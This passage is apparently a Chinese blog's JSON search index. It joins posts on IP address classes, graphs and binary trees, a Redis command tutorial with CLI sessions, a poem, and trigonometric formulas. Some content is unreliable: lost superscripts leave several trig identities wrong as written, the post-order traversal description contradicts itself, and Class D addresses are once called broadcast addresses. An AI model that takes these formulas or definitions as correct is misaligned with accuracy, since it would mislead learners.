一个B类IP地址由2个字节的网络地址和2个字节的主机地址组成，网络地址的最高位必须是“10”，地址范围从128.0.0.0到191.255.255.255。可用的B类网络有16382个，每个网络能容纳6万多个主机 。 C类IP地址 一个C类IP地址由3字节的网络地址和1字节的主机地址组成，网络地址的最高位必须是“110”。范围从192.0.0.0到223.255.255.255。C类网络可达209万余个，每个网络能容纳254个主机。 D类地址用于多点广播（Multicast）。 D类IP地址第一个字节以“lll0”开始，它是一个专门保留的地址。它并不指向特定的网络，目前这一类地址被用在多点广播（Multicast）中。多点广播地址用来一次寻址一组计算机，它标识共享同一协议的一组计算机。224.0.0.0到239.255.255.255用于多点广播 。 E类IP地址 以“llll0”开始，为将来使用保留。240.0.0.0到255.255.255.254,255.255.255.255用于广播地 址。 全零（“0．0．0．0”）地址对应于当前主机。全“1”的IP地址（“255．255．255．255”）是当前子网的广播地址。 在IP地址3种主要类型里，各保留了3个区域作为私有地址，其地址范围如下： A类地址：10.0.0.0～10.255.255.255B类地址：172.16.0.0～172.31.255.255C类地址：192.168.0.0～192.168.255.255 A类地址的第一组数字为1～126。其中0代表任何地址，127为回环测试地址，注意，数字0和 127不作为A类地址，数字127保留给内部回送函数，而数字0则表示该地址是本地宿主机，不能传送。B类地址的第一组数字为128～191。C类地址的第一组数字为192～223。 A类地址 A类地址的表示范围为：0.0.0.0~126.255.255.255，默认网络掩码为：255.0.0.0；A类地址分配给规模特别大的网络使用。A类网络用第一组数字表示网络本身的地址，后面三组数字作为连接于网络上的主机的地址。分配给具有大量主机（直接个人用户）而局域网络个数较少的大型网络。例如IBM公司的网络。 B类地址B类地址的表示范围为：128.0.0.0~191.255.255.255，默认网络掩码为：255.255.0.0；B类地址分配给一般的中型网络。B类网络用第一、二组数字表示网络的地址，后面两组数字代表网络上的主机地址。 C类地址 C类地址的表示范围为：192.0.0.0~223.255.255.255，默认网络掩码为：255.255.255.0；C类地址分配给小型网络，如一般的局域网和校园网，它可连接的主机数量是最少的，采用把所属的用户分为若干的网段进行管理。C类网络用前三组数字表示网络的地址，最后一组数字作为网络上的主机地址。 实际上，还存在着D类地址和E类地址。但这两类地址用途比较特殊，在这里只是简单介绍一下：D类地址称为广播地址，供特殊协议向选定的节点发送信息时用。E类地址保留给将来使用。 参考资料 TCP 基礎網路概念 IP子网划分的基本概念 《TCP/IP详解卷1：协议》","updated":"2020-07-19T00:23:27.814Z","tags":[{"name":"http","slug":"http","permalink":"http://xwolf191.github.io/tags/http/"}]},{"title":"数据结构(7)、图","date":"2017-11-17T12:15:00.000Z","path":"2017/11/17/数据结构和算法/数据结构(7)、图/","text":"在数学的分支图论中，图（Graph）用于表示物件与物件之间的关系，是图论的基本研究对象。一张图由一些小圆点（称为顶点或结点）和连结这些圆点的直线或曲线（称为边）组成。西尔维斯特在1878年首次提出“图”这一名词。 定义 图有多种变体，包括简单图、多重图、有向图、无向图等，但大体上有以下两种定义方式。 二元组的定义 一张图 G 是一个二元组(V,E)，其中 V称为顶点集， E称为边集。它们亦可写成 V(G) 和 E(G) 。 E的元素是一个二元组数对，用 (x,y)表示，其中 x,y \\in V。 三元组的定义 一张图 G 是一个三元组(V,E,I)，其中 V称为顶集（Vertices set）,E称为边集（Edges set）， E与 V不相交；I称为关联函数，I将E中的每一个元素映射到V\\times V。如果 I(e)=(u,v) (e\\in E, u,v \\in V)那么称边 e连接顶点 u,v，而 u,v则称作 e的端点，u,v此时关于 e相邻。同时，若两条边 i,j有一个公共顶点 u，则称 i,j关于 u相邻。","updated":"2020-07-19T00:23:28.051Z","tags":[{"name":"数据结构和算法","slug":"数据结构和算法","permalink":"http://xwolf191.github.io/tags/数据结构和算法/"}]},{"title":"数据结构(6):树","date":"2017-11-16T12:15:00.000Z","path":"2017/11/16/数据结构和算法/数据结构(6)、树/","text":"树（tree）是n（n&gt;=0）个结点的有穷集。n=0时称为空树。在任意一个非空树中：（1）每个元素称为结点（node）；（2）仅有一个特定的结点被称为根结点或树根（root）。（3）当n&gt;1时，其余结点可分为m（m≥0）个互不相交的集合T1，T2，……Tm，其中每一个集合Ti（1&lt;=i&lt;=m）本身也是一棵树，被称作根的子树（subtree）。 在计算机科学中，二叉树是每个节点最多有两个子树的树结构。通常子树被称作“左子树”（left subtree）和“右子树”（right subtree）。二叉树常被用于实现二叉查找树和二叉堆。 二叉树的每个结点至多只有二棵子树(不存在度大于2的结点)，二叉树的子树有左右之分，次序不能颠倒。二叉树的第i层至多有2^{i-1}个结点；深度为k的二叉树至多有2^k-1个结点；对任何一棵二叉树T，如果其终端结点数为n_0，度为2的结点数为n_2，则n_0=n_2+1。 树和二叉树的三个主要差别： 树的结点个数至少为1，而二叉树的结点个数可以为0；树中结点的最大度数没有限制，而二叉树结点的最大度数为2；树的结点无左、右之分，而二叉树的结点有左、右之分。 二叉树特性在二叉树的第i层上至多有2^(i-1)个结点(i&gt;=1).深度为k的二叉树至多有2^k-1个结点（k&gt;=1）。对任何一棵二叉树T，如果其终端结点个数为n0，度为2的结点数为n2，则n0 = n2 + 1。 终端结点也就是叶子结点，而一棵树，除了叶子结点外，剩下的就是度为1或2的结点数，我们设n1为度是1的结点数，则树的结点总数n=n0+n1+n2. 从分支数的角度再来思考，由于根节点只有分支出去，没有分支进来，所以总的分支线总数为结点总数减去1，由上图得到，对于ABCD结点来说，它们有两个分支线出去，而E结点只有一个分支线出去。所以总分支线为42+11=9.用代数表达式就是分支线总数=n-1=n1+2n2,即度为1的个数加上度为2的个数，即是分支数。n0+n1+n2-1=n1+2n2 结论就是n0=n2+1。 具有n个结点的完全二叉树的深度为「log2n」+ 1(「x」表示不大于x的最大整数)。如果对一棵有n个结点的完全二叉树的结点按层序编号（从第一层到第「log2n」+ 1层，每层从左到右），对任一结点i（1≤i≤n）有： 若i=1，则结点i是二叉树的根，无双亲；如i&gt;1，则其双亲是结点「i/2」。 如2i&gt;n，则结点i无左孩子（结点i为叶子结点）；否则其左孩子是结点2i。 若2i+1&gt;n，则结点i无右孩子；否则其右孩子是结点2i+1。 完全二叉树和满二叉树满二叉树 在一棵二叉树中，如果所有分支结点都存在左子树和右子树，并且所有叶子都在同一层上，这样的二叉树称为满二叉树。满二叉树具有如下特点： 叶子只能出现在最下一层 非叶子结点的度一定是2 同样深度的二叉树中，满二叉树的结点个数最多，叶子数最多。 完全二叉树 若设二叉树的高度为h，除第 h 层外，其它各层 (1～h-1) 的结点数都达到最大个数，第h层有叶子结点，并且叶子结点都是从左到右依次排布，这就是完全二叉树。完全二叉树的特点： 叶子结点只能出现在最下两层 最下层叶子在左部并且连续 同样结点数的二叉树，完全二叉树的深度最小 类型 (1)完全二叉树——若设二叉树的高度为h，除第 h 层外，其它各层 (1～h-1) 的结点数都达到最大个数，第h层有叶子结点，并且叶子结点都是从左到右依次排布，这就是完全二叉树。(2)满二叉树——除了叶结点外每一个结点都有左右子叶且叶子结点都处在最底层的二叉树。(3)平衡二叉树——平衡二叉树又被称为AVL树（区别于AVL算法），它是一棵二叉排序树，且具有以下性质：它是一棵空树或它的左右两个子树的高度差的绝对值不超过1，并且左右两个子树都是一棵平衡二叉树。相关术语 树的结点：包含一个数据元素及若干指向子树的分支；孩子结点：结点的子树的根称为该结点的孩子；双亲结点：B 结点是A 结点的孩子，则A结点是B 结点的双亲；兄弟结点：同一双亲的孩子结点； 堂兄结点：同一层上结点；祖先结点: 从根到该结点的所经分支上的所有结点子孙结点：以某结点为根的子树中任一结点都称为该结点的子孙结点层：根结点的层定义为1；根的孩子为第二层结点，依此类推；树的深度：树中最大的结点层结点的度：结点子树的个数树的度： 树中最大的结点度。叶子结点：也叫终端结点，是度为 0 的结点；分枝结点：度不为0的结点；有序树：子树有序的树，如：家族树；无序树：不考虑子树的顺序 二叉树的实现二叉树的遍历前序遍历 前序遍历(DLR)首先访问根结点然后遍历左子树，最后遍历右子树。在遍历左、右子树时，仍然先访问根结点，然后遍历左子树，最后遍历右子树。若二叉树为空则结束返回,否则： 访问根结点。 递归遍历左子树。 递归遍历右子树。 需要注意的是：遍历左右子树时仍然采用前序遍历方法。 如上图所示二叉树前序遍历结果：ABDCEF 中序遍历 中序遍历首先遍历左子树再访问根节点,再遍历右子树。若二叉树为空则结束返回,否则： 递归遍历左子树。 访问根结点。 递归遍历右子树 。 上图中序遍历结果：DBAECF 后序遍历 后序遍历首先遍历左子树,再遍历左子树,再访问根节点。若二叉树为空则结束返回,否则： 递归遍历右子树。 递归遍历左子树 。 访问根结点。 上图后序遍历结果：DBEFCA 层序遍历 自上而下，从左到右逐层访问节点。上图层序遍历的结果：ABCDEF 树、二叉树和森林的转换 参考资料: 大话数据结构 算法导论 树——维基百科) Binary_tree","updated":"2020-07-19T00:23:28.050Z","tags":[{"name":"数据结构和算法","slug":"数据结构和算法","permalink":"http://xwolf191.github.io/tags/数据结构和算法/"}]},{"title":"数据结构(5):串","date":"2017-11-15T12:15:00.000Z","path":"2017/11/15/数据结构和算法/数据结构(5)、串/","text":"","updated":"2020-07-19T00:23:28.050Z","tags":[{"name":"数据结构和算法","slug":"数据结构和算法","permalink":"http://xwolf191.github.io/tags/数据结构和算法/"}]},{"title":"Redis入门","date":"2017-11-15T09:42:00.000Z","path":"2017/11/15/distributed/Redis入门/","text":"Redis是一个使用ANSI C编写的开源、支持网络、基于内存、可选持久性的键值对存储数据库。从2015年6月开始，Redis的开发由Redis Labs赞助，而2013年5月至2015年6月期间，其开发由Pivotal赞助。在2013年5月之前，其开发由VMware赞助。根据月度排行网站DB-Engines.com的数据显示，Redis是最流行的键值对存储数据库。 Redis的外围由一个键、值映射的字典构成。与其他非关系型数据库主要不同在于：Redis中值的类型不仅限于字符串，还支持如下抽象数据类型： 字符串列表 无序不重复的字符串集合 有序不重复的字符串集合 键、值都为字符串的哈希表 值的类型决定了值本身支持的操作。Redis支持不同无序、有序的列表，无序、有序的集合间的交集、并集等高级服务器端原子操作。 一、数据类型和基础命令 1、 String 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677#查看所有的key127.0.0.1:36379&gt; keys *(empty list or set)#为a 赋值127.0.0.1:36379&gt; set a \"123\"OK#获取a的值127.0.0.1:36379&gt; get a\"123\"#再次赋值已经存在的变量,会覆盖原值127.0.0.1:36379&gt; set a \"4322\"OK127.0.0.1:36379&gt; get a\"4322\"#获取不存在的key,返回nil127.0.0.1:36379&gt; get b(nil)#判断是否存在一个key,0表示不存在127.0.0.1:36379&gt; exists b(integer) 0127.0.0.1:36379&gt; exists a(integer) 1#输入不存在的命令,会出错误127.0.0.1:36379&gt; len a(error) ERR unknown command 'len'#字符串的长度127.0.0.1:36379&gt; strlen a(integer) 4127.0.0.1:36379&gt; set b 21OK#自增key的值127.0.0.1:36379&gt; incr b(integer) 22#key 加上指定的值127.0.0.1:36379&gt; incrby b 2(integer) 24#key 自减127.0.0.1:36379&gt; decr b(integer) 23#key 减去指定值127.0.0.1:36379&gt; decrby b 2(integer) 21127.0.0.1:36379&gt;#添加指定的浮点值127.0.0.1:36379&gt; incrbyfloat b 1.32\"22.32\"#获取多个key的值127.0.0.1:36379&gt; mget a b1) \"4322\"2) \"24\"# key后追加指定的value127.0.0.1:36379&gt; append a \"dfkuaidi\"(integer) 12127.0.0.1:36379&gt; get a\"4322dfkuaidi\"#getset 返回旧的值,重新赋新值。key不存在返回nil127.0.0.1:36379&gt; getset a \"kuaidi\"\"4322dfkuaidi\"127.0.0.1:36379&gt; get a\"kuaidi\"#删除key127.0.0.1:36379&gt; del a(integer) 1 2、 Hash 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566#获取指定key 的指定field127.0.0.1:36379&gt; hget a f(nil)#hset添加127.0.0.1:36379&gt; hset user id 1(integer) 1#获取key的field的value127.0.0.1:36379&gt; hget user id\"1\"127.0.0.1:36379&gt; hset user name \"lisi\"(integer) 1127.0.0.1:36379&gt; hset user age 32(integer) 1127.0.0.1:36379&gt; hset user status 1(integer) 1127.0.0.1:36379&gt; hget user name\"lisi\"#获取key所有的field/value127.0.0.1:36379&gt; hgetall user1) \"id\"2) \"1\"3) \"name\"4) \"lisi\"5) \"age\"6) \"32\"7) \"status\"8) \"1\"#获取key多个field127.0.0.1:36379&gt; hmget user id name1) \"1\"2) \"lisi\"#判断key中是否存在指定的field127.0.0.1:36379&gt; hexists user fs(integer) 0127.0.0.1:36379&gt; hexists user id(integer) 1#获取key的所有field，不包含value127.0.0.1:36379&gt; hkeys user1) \"id\"2) \"name\"3) \"age\"4) \"status\"#获取所有的value127.0.0.1:36379&gt; hvals user1) \"1\"2) \"lisi\"3) \"32\"4) \"1\"#删除指定的key127.0.0.1:36379&gt; hdel user age(integer) 1127.0.0.1:36379&gt; hgetall user1) \"id\"2) \"1\"3) \"name\"4) \"lisi\"5) \"status\"6) \"1\" 3、List 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475#lpop 从最左边移除元素,key不存在什么也不做127.0.0.1:36379&gt; lpop users(nil)#lpush 从左边入栈,key不存在会创建区别于lpushx127.0.0.1:36379&gt; lpush users \"lao wang\"(integer) 1127.0.0.1:36379&gt; lpush users \"lao li\"(integer) 2127.0.0.1:36379&gt; lpush users \"lao wan\"(integer) 3#llen key 获取长度127.0.0.1:36379&gt; llen users(integer) 3#lindex key index 获取key索引位置为第index个的元素127.0.0.1:36379&gt; lindex users 1\"lao li\"#lrange 获取key 起始位置的元素127.0.0.1:36379&gt; lrange users 1 41) \"lao li\"2) \"lao wang\"#linsert key BEFORE/AFTER o n,在指定key的o 元素 BEFORE/AFTER 插入元素 n127.0.0.1:36379&gt; linsert user before \"lao li\" \"diao si\"(integer) 0#rpush 从右侧入栈127.0.0.1:36379&gt; rpush users \"ai ya\"(integer) 4#llen key 获取key的元素个数127.0.0.1:36379&gt; llen users(integer) 4#lrange key start end ,取出key的 start 到end 的索引位置的元素127.0.0.1:36379&gt; lrange users 0 201) \"lao wan\"2) \"lao li\"3) \"lao wang\"4) \"ai ya\"#lpushx key value ,如果key不存在什么也不做127.0.0.1:36379&gt; lpushx use 32(integer) 0127.0.0.1:36379&gt; lpush user 32(integer) 1127.0.0.1:36379&gt; lrange users 0 201) \"diao si\"2) \"lao li\"3) \"lao wang\"#lset LSET key index value,将列表 key 下标为 index 的元素的值设置为 value 。当 index #参数超出范围，或对一个空列表( key 不存在)进行 LSET 时，返回一个错误。127.0.0.1:36379&gt; lset users 0 \"qiong diao si\"OK127.0.0.1:36379&gt; lrange users 0 201) \"qiong diao si\"2) \"lao li\"3) \"lao wang\"127.0.0.1:36379&gt; lrange users 0 201) \"lao\"2) \"lao\"3) \"lao\"4) \"lao\"5) \"qiong diao si\"6) \"lao li\"7) \"lao wang\"#LREM key count value,根据参数 count 的值，移除列表中与参数 value 相等的元素。127.0.0.1:36379&gt; lrem users 3 \"lao\"(integer) 3127.0.0.1:36379&gt; lrange users 0 201) \"lao\"2) \"qiong diao si\"3) \"lao li\"4) \"lao wang\"#删除key 127.0.0.1:36379&gt; del user(integer) 1 4、Set 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152#sadd 操作为集合类型，错误127.0.0.1:36379&gt; sadd users \"1\" \"2\" \"3\" \"4\"(error) WRONGTYPE Operation against a key holding the wrong kind of value127.0.0.1:36379&gt; del users(integer) 1#sadd 添加多个元素127.0.0.1:36379&gt; sadd users \"1\" \"2\" \"3\" \"4\"(integer) 4#smembers 查看所有元素127.0.0.1:36379&gt; smembers users1) \"1\"2) \"2\"3) \"3\"4) \"4\"#sadd 重复添加元素127.0.0.1:36379&gt; sadd user \"3\"(integer) 1##set 不会有重复数据127.0.0.1:36379&gt; smembers users1) \"1\"2) \"2\"3) \"3\"4) \"4\"##sismember 判断集合中是否包含指定元素,是返回1 不是返回0127.0.0.1:36379&gt; sismember users \"1\"(integer) 1127.0.0.1:36379&gt; sismember users \"13\"(integer) 0127.0.0.1:36379&gt; sadd user_1 \"3\" \"4\" \"5\" \"6\"(integer) 4#sunion 合并两个集合127.0.0.1:36379&gt; sunion users user_11) \"1\"2) \"2\"3) \"3\"4) \"4\"5) \"5\"6) \"6\"127.0.0.1:36379&gt; smembers users1) \"1\"2) \"2\"3) \"3\"4) \"4\"127.0.0.1:36379&gt; smembers user_11) \"3\"2) \"4\"3) \"5\"4) \"6\"#sdiff 获取左集合的差集127.0.0.1:36379&gt; sdiff users user_11) \"1\"2) \"2\"127.0.0.1:36379&gt; sdiff user_1 users1) \"5\"2) \"6\"127.0.0.1:36379&gt; sadd users \"1\" \"2\" \"3\" \"4\" \"5\"(integer) 5127.0.0.1:36379&gt; sadd user_1 \"3\" \"4\" \"5\" \"6\" \"7\"(integer) 5127.0.0.1:36379&gt; sdiff users user_11) \"1\"2) \"2\"127.0.0.1:36379&gt; sdiff k1 users user_1(empty list or set)#sdiffstore 求差集，它将结果保存到 dest 集合，而不是简单地返回结果集。127.0.0.1:36379&gt; sdiffstore k1 users user_1(integer) 2127.0.0.1:36379&gt; smembers k11) \"1\"2) \"2\"#sinter 获取两个集合的交集127.0.0.1:36379&gt; sinter users user_11) \"3\"2) \"4\"#sinterstore 求交集，它将结果保存到 dest 集合，而不是简单地返回结果集。127.0.0.1:36379&gt; sinterstore k2 users user_1(integer) 3127.0.0.1:36379&gt; smembers k21) \"3\"2) \"4\"3) \"5\"##SRANDMEMBER key [count]##如果命令执行时，只提供了 key 参数，那么返回集合中的一个随机元素。##从 Redis 2.6 版本开始， SRANDMEMBER 命令接受可选的 count参数：如果count为正数，且小于集合基数,那么命令返回一##个包含count个元素的数组，数组中的元素各不相同。 如果 count 大于等于集合基数，那么返回整个集合。##如果 count 为负数，那么命令返回一个数组，数组中的元素可能会重复出现多次，而数组的长度为 count ##的绝对值。127.0.0.1:36379&gt; srandmember users\"4\"127.0.0.1:36379&gt; srandmember users 21) \"4\"2) \"1\"127.0.0.1:36379&gt; srandmember users 31) \"2\"2) \"4\"3) \"1\"127.0.0.1:36379&gt; srandmember users 31) \"2\"2) \"4\"3) \"1\"127.0.0.1:36379&gt; srandmember users -31) \"3\"2) \"3\"3) \"1\"#SPOP 移除并返回集合中的一个随机元素。127.0.0.1:36379&gt; spop users\"4\"127.0.0.1:36379&gt; smembers users1) \"1\"2) \"2\"3) \"3\"4) \"5\"#srem 删除指定的元素127.0.0.1:36379&gt; srem users \"fsdf\"(integer) 0127.0.0.1:36379&gt; srem users \"1\"(integer) 1127.0.0.1:36379&gt; smembers users1) \"2\"2) \"3\"3) \"5\"127.0.0.1:36379&gt; smembers users1) \"2\"2) \"3\"3) \"5\"127.0.0.1:36379&gt; smembers user_11) \"3\"2) \"4\"3) \"5\"4) \"6\"5) \"7\"##SMOVE source destination member##将 member 元素从 source 集合移动到 destination 集合。127.0.0.1:36379&gt; smove users user_1 \"6\"(integer) 0127.0.0.1:36379&gt; smove users user_1 \"2\"(integer) 1127.0.0.1:36379&gt; smembers users1) \"3\"2) \"5\"127.0.0.1:36379&gt; smembers user_11) \"2\"2) \"3\"3) \"4\"4) \"5\"5) \"6\"6) \"7\" 5、Sorted Set(有序集合) Sorted Set和Set类型极为相似，它们都是字符串的集合，都不允许重复的成员出现在一个Set中。它们之间的主要差别是Sorted Set中的每一个成员都会有一个分数(score)与之关联，Redis正是通过分数来为集合中的成员进行从小到大的排序。然而需要额外指出的是，尽管Sorted Set中的成员必须是唯一的，但是分数(score)却是可以重复的。123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172#zadd key score member [score member...] #将一个或多个 member 元素及其 score 值加入到有序集 key 当中。#如果某个 member 已经是有序集的成员，那么更新这个 member 的 score 值，并通过重新插入这个 #member 元素，来保证该 member 在正确的位置上。#score 值可以是整数值或双精度浮点数。127.0.0.1:36379&gt; zadd users 1.0 \"wang\" 2.1 \"li\"(integer) 2127.0.0.1:36379&gt; zmembers users#zscore key member 获取指定member的score值127.0.0.1:36379&gt; zscore users wang\"1\"127.0.0.1:36379&gt; zscore users li\"2.1000000000000001\"#ZCOUNT key min max#返回有序集 key 中， score 值在 min 和 max 之间(默认包括 score 值等于 min 或 max )的成员的数量。127.0.0.1:36379&gt; zcount users 0 20(integer) 2#ZRANGE key start stop [WITHSCORES]#返回有序集 key 中，指定区间内的成员。#其中成员的位置按 score 值递增(从小到大)来排序。#具有相同 score 值的成员按字典序来排列。ZREVRANGE 刚好相反.127.0.0.1:36379&gt; zrange users 0 201) \"wang\"2) \"li\"127.0.0.1:36379&gt; zrange users 0 201) \"wang\"2) \"li\"127.0.0.1:36379&gt; zadd users 2.1 \"sun\"(integer) 1127.0.0.1:36379&gt; zrange users 0 201) \"wang\"2) \"li\"3) \"sun\"127.0.0.1:36379&gt; zadd users 22 \"zhang\"(integer) 1127.0.0.1:36379&gt; zrangebyscore users 0 21) \"wang\"127.0.0.1:36379&gt; zrangebyscore users 0 201) \"wang\"2) \"li\"3) \"sun\"# ZRANGEBYSCORE key min max [WITHSCORES] [LIMIT offset count]# 返回有序集 key 中，所有 score 值介于 min 和 max 之间(包括等于 min 或 max )的成员。有序集成员按 # score 值递增(从小到大)次序排列。#具有相同 score 值的成员按字典序(lexicographical #order)来排列(该属性是有序集提供的，不需要额外的计算)。#可选的 LIMIT 参数指定返回结果的数量及区间(就像SQL中的 SELECT LIMIT offset, count )#，注意当offset 很大时，定位 offset 的操作可能需要遍历整个有序集，此过程最坏复杂度为 O(N).#ZRANGEBYSCORE刚好相反.127.0.0.1:36379&gt; zrangebyscore users 0 20 withscores limit 1 11) \"li\"2) \"2.1000000000000001\"127.0.0.1:36379&gt; zrangebyscore users 0 20 withscores limit 1 21) \"li\"2) \"2.1000000000000001\"3) \"sun\"4) \"2.1000000000000001\"#ZRANK key member#返回有序集 key 中成员 member 的排名。其中有序集成员按 score 值递增(从小到大)顺序排列。#排名以 0 为底，也就是说， score 值最小的成员排名为 0 。127.0.0.1:36379&gt; zrank users li(integer) 1127.0.0.1:36379&gt; zrank users sun(integer) 2#ZREVRANK key member#返回有序集 key 中成员 member 的排名。其中有序集成员按 score 值递减(从大到小)排序。#排名以 0 为底，也就是说， score 值最大的成员排名为 0 。127.0.0.1:36379&gt; zrevrank users sun(integer) 1 至此，大部分常用命令已经操作完毕，可能会有部分遗漏命令，请自行学习。 参考资料: Redis Redis命令参考 字典排序","updated":"2020-07-19T00:23:27.813Z","tags":[{"name":"redis","slug":"redis","permalink":"http://xwolf191.github.io/tags/redis/"}]},{"title":"数据结构(4):栈和队列","date":"2017-11-14T12:15:00.000Z","path":"2017/11/14/数据结构和算法/数据结构(4)、栈和队列/","text":"","updated":"2020-07-19T00:23:28.049Z","tags":[{"name":"数据结构和算法","slug":"数据结构和算法","permalink":"http://xwolf191.github.io/tags/数据结构和算法/"}]},{"title":"热爱生命","date":"2017-11-14T12:10:00.000Z","path":"2017/11/14/杂侃/热爱生命/","text":"热爱生命 汪国真 我不去想, 是否能够成功, 既然选择了远方, 便只顾风雨兼程。 我不去想, 能否赢得爱情, 既然钟情于玫瑰, 就勇敢地吐露真诚 。 我不去想, 身后会不会袭来寒风冷雨, 既然目标是地平线, 留给世界的只能是背影 。 我不去想, 未来是平坦还是泥泞, 只要热爱生命, 一切,都在意料之中。","updated":"2020-07-19T00:23:28.426Z","tags":[{"name":"杂侃","slug":"杂侃","permalink":"http://xwolf191.github.io/tags/杂侃/"}]},{"title":"三角函数常用公式","date":"2017-11-10T14:30:00.000Z","path":"2017/11/10/数学/三角函数公式/","text":"1.诱导公式 sin(-a) = - sin(a) cos(-a) = cos(a) sin(π/2 - a) = cos(a) cos(π/2 - a) = sin(a) sin(π/2 + a) = cos(a) cos(π/2 + a) = - sin(a) sin(π - a) = sin(a) cos(π - a) = - cos(a) sin(π + a) = - sin(a) cos(π + a) = - cos(a) 2.两角和与差的三角函数 sin(a + b) = sin(a)cos(b) + cos(α)sin(b) cos(a + b) = cos(a)cos(b) - sin(a)sin(b) sin(a - b) = sin(a)cos(b) - cos(a)sin(b) cos(a - b) = cos(a)cos(b) + sin(a)sin(b) tan(a + b) = [tan(a) + tan(b)] / [1 - tan(a)tan(b)] tan(a - b) = [tan(a) - tan(b)] / [1 + tan(a)tan(b)] 3.和差化积公式 sin(a) + sin(b) = 2sin[(a + b)/2]cos[(a - b)/2] sin(a) - sin(b) = 2sin[(a - b)/2]cos[(a + b)/2] cos(a) + cos(b) = 2cos[(a + b)/2]cos[(a - b)/2] cos(a) - cos(b) = - 2sin[(a + b)/2]sin[(a - b)/2] 4.积化和差公式 sin(a)sin(b) = - 1/2[cos(a + b) - cos(a - b)] cos(a)cos(b) = 1/2[cos(a + b) + cos(a -b)] sin(a)cos(b) = 1/2[sin(a + b) + sin(a - b)] 5.二倍角公式 sin(2a) = 2sin(a)cos(a) cos 2a = cos2a - sin2a = 2cos2a - 1= 1 - 2sin2a 6.半角公式 sin2a = （1 – cos 2a）/ 2cos2a = （1 + cos 2a）/ 2tan a = [1 – cos 2a] /sin 2a = sin 2a / [1 + cos 2a ] 7.万能公式 sin(a) = 2tan(a/2) / [1+tan2(a/2)] cos(a) = [1-tan2(a/2)] / [1+tan2(a/2)] tan(a) = 2tan(a/2) / [1-tan2(a/2)]三角函数公式求助编辑百科名片三角函数是数学中属于初等函数中的超越函数的一类函数。它们的本质是任何角的集合与一个比值的集合的变量之间的映射。通常的三角函数是在平面直角坐标系中定义的。其定义城为整个实数城。另一种定义是在直角三角形中，但并不完全。现代数学把它们描述成无穷敖列的极限和微分方程的解，将其定义扩展到复数系。目录公式分类 同角三角函数的基本关系 平常针对不同条件的常用的两个公式 一个特殊公式 坡度公式 锐角三角函数公式 二倍角公式三倍角公式 三倍角公式 半角公式 万能公式其他 四倍角公式 五倍角公式六倍角公式 七倍角公式八倍角公式 九倍角公式十倍角公式N倍角公式 半角公式 两角和公式三角和公式 和差化积积化和差 双曲函数 三角函数的诱导公式（六公式）万能公式 其它公式内容规律公式分类 同角三角函数的基本关系 平常针对不同条件的常用的两个公式一个特殊公式 坡度公式锐角三角函数公式 二倍角公式三倍角公式 三倍角公式 半角公式万能公式 其他四倍角公式 五倍角公式 六倍角公式 七倍角公式 八倍角公式 九倍角公式 十倍角公式 N倍角公式 半角公式 两角和公式 三角和公式 和差化积 积化和差双曲函数 三角函数的诱导公式（六公式）万能公式 其它公式内容规律展开编辑本段公式分类同角三角函数的基本关系 倒数关系： tanα ·cotα=1 sinα ·cscα=1 cosα·secα=1 商的关系： sinα/cosα=tanα=secα/cscα 平方关系： 平常针对不同条件的常用的两个公式 一个特殊公式 （sina+sinθ）（sina-sinθ）=sin（a+θ）sin（a-θ） 证明：（sina+sinθ）（sina-sinθ）=2 sin[(θ+a)/2] cos[(a-θ)/2] 2 cos[(θ+a)/2] sin[(a-θ)/2] =sin（a+θ）*sin（a-θ）坡度公式 我们通常把坡面的铅直高度h与水平高度l的比叫做坡度（也叫坡比）， 用字母i表示， 即 i=h / l,坡度的一般形式写成 l : m形式，如i=1:5.如果把坡面与水平面的夹角记作 a(叫做坡角），那么 i=h/l=tan a.锐角三角函数公式 正弦： sinα=∠α的对边/∠α 的斜边 余弦：cosα=∠α的邻边/∠α的斜边 正切：tanα=∠α的对边/∠α的邻边 余切：cotα=∠α的邻边/∠α的对边二倍角公式 正弦 sin2A=2sinA·cosA 余弦 正切 tan2A=（2tanA）/（1-tan^2(A)）三倍角公式 三倍角公式 sin3α=4sinα·sin(π/3+α)sin(π/3-α) cos3α=4cosα·cos(π/3+α)cos(π/3-α) tan3a = tan a · tan(π/3+a)· tan(π/3-a) 三倍角公式推导 sin(3a) =sin(a+2a) =sin2acosa+cos2asina =2sina(1-sina)+(1-2sina)sina =3sina-4sin^3a cos3a =cos(2a+a) =cos2acosa-sin2asina =(2cosa-1)cosa-2(1-cos^a)cosa =4cos^3a-3cosa sin3a=3sina-4sin^3a =4sina(3/4-sina) =4sina[(√3/2)-sina] =4sina(sin60°-sina) =4sina(sin60°+sina)(sin60°-sina) =4sina2sin[(60+a)/2]cos[(60°-a)/2]2sin[(60°-a)/2]cos[(60°-a)/2] =4sinasin(60°+a)sin(60°-a) cos3a=4cos^3a-3cosa =4cosa(cosa-3/4) =4cosa[cosa-(√3/2)^2] =4cosa(cosa-cos30°) =4cosa(cosa+cos30°)(cosa-cos30°) =4cosa2cos[(a+30°)/2]cos[(a-30°)/2]{-2sin[(a+30°)/2]sin[(a-30°)/2]} =-4cosasin(a+30°)sin(a-30°) =-4cosasin[90°-(60°-a)]sin[-90°+(60°+a)] =-4cosacos(60°-a)[-cos(60°+a)] =4cosacos(60°-a)cos(60°+a) 上述两式相比可得 tan3a=tanatan(60°-a)tan(60°+a) 现列出公式如下： sin2α=2sinαcosα tan2α=2tanα/(1-tanα ） cos2α=cosα-sinα=2cosα-1=1-2sinα 可别轻视这些字符，它们在数学学习中会起到重要作用，包括在一些图像问题和函数问题中三倍角公式 sin3α=3sinα-4sinα=4sinα·sin(π/3+α)sin(π/3-α) cos3α=4cosα-3cosα=4cosα·cos(π/3+α)cos(π/3-α) tan3α=tan(α)(-3+tan(α)^2)/(-1+3tan(α)^2)=tan a · tan(π/3+a)· tan(π/3-a)半角公式 sin^2(α/2)=(1-cosα)/2 cos^2(α/2)=(1+cosα)/2 tan^2(α/2)=(1-cosα)/(1+cosα) tan(α/2)=sinα/(1+cosα)=(1-cosα)/sinα万能公式 sinα=2tan(α/2)/[1+tan(α/2)] cosα=[1-tan(α/2)]/[1+tan^2(α/2)] tanα=2tan(α/2)/[1-tan&amp;s(α/2)]其他 